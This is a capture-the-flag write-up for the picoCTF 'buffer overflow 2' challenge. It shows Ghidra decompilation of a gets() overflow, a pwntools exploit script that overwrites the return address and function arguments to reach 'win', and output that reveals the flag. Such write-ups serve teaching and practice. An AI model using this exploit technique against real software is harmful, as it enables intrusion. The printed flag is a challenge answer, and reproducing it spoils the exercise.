# buffer overflow 2 Writeup

## Steps:
1. Open in ghidra and analyze
        - Notice functions called `vuln` and `win`
```
void vuln(void){
  char local_70 [104];
  
  gets(local_70);
  puts(local_70);
  return;
}


void win(int param_1,int param_2){
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x35010ff3) && (param_2 == -0xff20ff3)) {
      printf(local_50);
    }
    return;
  }
  printf("%s %s","Please create \'flag.txt\' in this directory with your","own debugging flag.\n");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
2. Plan: 
    a. overflow the buffer in vuln and overwrite the return address to be `win` (same as buffer overflow 2)
    b. overflow param_1 and param_2 so they equal `0xCAFEF00D` and `0xF00DF00D`

3. Overflow the parameters. Identify where they should be by running the code using `gdb.attach` and checking the stack when the cmp is called for param_1. There will need to be 4 more bytes of buffer in the payload before the new values.

4. Create the payload and send it to the process
```
from pwn import *

# p = process("./vuln")
p = remote("saturn.picoctf.net",57200)
# gdb.attach(p, gdbscript='b *main')

win = 0x08049296
param1 = 0xcafef00d
param2 = 0xf00df00d

payload = b"A" * 112
payload += p32(win)
payload += b"B" * 4
payload += p32(param1) + p32(param2)

p.sendline(payload)

# p.interactive()
print(p.recvall().decode('latin-1'))
```


## Solution:
```
$ python3 exploit.py
[+] Opening connection to saturn.picoctf.net on port 57200: Done
[+] Receiving all data: Done (190B)
[*] Closed connection to saturn.picoctf.net port 57200
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04ðþÊ8BBBB
picoCTF{argum3nt5_4_d4yZ_3c04eab0}
```
                                    
